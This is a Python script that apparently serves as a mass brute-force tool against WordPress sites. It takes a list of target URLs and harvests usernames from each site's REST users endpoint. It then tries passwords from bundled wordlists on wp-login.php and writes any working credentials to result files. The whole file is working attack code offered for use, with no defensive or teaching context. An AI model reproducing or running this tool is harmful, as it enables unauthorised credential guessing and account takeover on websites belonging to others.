import requests
import re
import urllib.parse
import urllib.request
from colorama import Fore, Style, init
import os

init()
reset = Style.RESET_ALL
yellow = Fore.LIGHTYELLOW_EX
magenta = Fore.LIGHTMAGENTA_EX
red = Fore.RED
cyan = Fore.LIGHTCYAN_EX
green = Fore.LIGHTGREEN_EX
blue = Fore.LIGHTBLUE_EX

def save(url, user, passwd):
    result_folder = 'result/'

    if not os.path.exists(result_folder):
        os.makedirs(result_folder)

    filename = os.path.join(result_folder, f'{url.replace("https://", "").replace("http://", "").replace("/", "_")}_results.txt')

    with open(filename, 'a') as file:
        file.write(f"Username: {user}\nPassword: {passwd}\n\n")

    print(f"{magenta}[{green}+{magenta}]{reset} Result saved to: {green}{filename}{reset}")
    return True

def r_file(file_name):
    try:
        with open(file_name, "r") as file:
            passwords = file.read().splitlines()
            return passwords
    except Exception as e:
        print(f"{magenta}[{red}-{magenta}]{reset} Failed To Load File {file_name}: {str(e)}")
        return []

def login(url, user, passwd):
    url = urllib.parse.urljoin(url, "wp-login.php")
    form = "log={}&pwd={}".format(user, passwd)
    form = bytes(form, "utf-8") 
    
    try:
        request = urllib.request.Request(url, data=form, method='POST')  
        with urllib.request.urlopen(request) as response:
            if re.search("wp-admin", response.url):
                return passwd
            else:
                return False
    except Exception as e:
        print(e)
        return False

def eu(url):
    try:
        api_url = url.rstrip("/") + "/wp-json/wp/v2/users"
        response = requests.get(api_url)

        if response.status_code == 200:
            users = response.json()
            usernames = [user['slug'] for user in users]
            return usernames

        return []
    except Exception as e:
        print(f"{magenta}[{red}-{magenta}]{reset} Failed to get username: {str(e)}")
        return []

def massWp():
    web_list_file = input(f"{magenta}BLACK@WPBF{reset} ──[{green}WEBSITES_LIST_FILE{reset}]──# ")
    web_list = r_file(web_list_file)
    print(f"""
          [{blue}1{reset}] Wordlist 1
          [{blue}2{reset}] Wordlist 2
          [{blue}3{reset}] Wordlist 3
          """)
    passwords = input(f"{magenta}BLACK@WPBF{reset} ──[{green}WORDLIST{reset}]──# ")
    if passwords == "1":
        passwd = "assets/pass/pass1.txt"
        p = r_file(passwd)
    elif passwords == "2":
        passwd = "assets/pass/pass2.txt"
        p = r_file(passwd)
    elif passwords == "3":
        passwd = "assets/pass/pass3.txt"
        p = r_file(passwd)

    for url in web_list:
        usernames = eu(url)
        if not usernames:
            print(f"{magenta}[{red}-{magenta}]{reset} Failed to get username for {url}")
            continue  # Lanjut ke web selanjutnya jika tidak dapat mendapatkan username

        print(f"{magenta}[{green}+{magenta}]{reset} List username from [ {green}{url}{reset} ]")
        for user in usernames:
            print(user)
        print(f"{magenta}[{green}+{magenta}]{reset} Trying login to [ {yellow}{url}{reset} ]")
        for passwd in p:
            result = login(url, user, passwd)
            if result:
                print(f"{magenta}[{green}+{magenta}]{reset} Login successful with username: {green}{user}{reset} and password: {green}{result}{reset} [{cyan}{url}{reset}]")
                save(url, user, passwd)
            else:
                print(f"{magenta}[{red}-{magenta}]{reset} Failed to login with username: {red}{user}{reset} and password: {red}{passwd}{reset} [{red}{url}{reset}]")
                # Lakukan sesuatu jika login gagal (opsional)
